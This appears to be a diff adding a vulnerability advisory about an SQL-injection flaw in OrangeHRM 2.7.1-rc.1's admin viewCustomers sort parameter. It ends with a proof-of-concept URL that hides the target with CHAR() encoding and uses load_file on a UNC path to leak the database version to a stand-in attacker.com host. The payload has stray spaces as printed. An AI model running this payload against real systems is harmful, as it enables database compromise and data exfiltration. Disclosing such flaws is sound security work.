@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/56417/info
+
+OrangeHRM is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+OrangeHRM 2.7.1-rc.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/symfony/web/index.php/admin/viewCustomers?sortOrder=ASC&sortField=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHA R(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114 )))) 
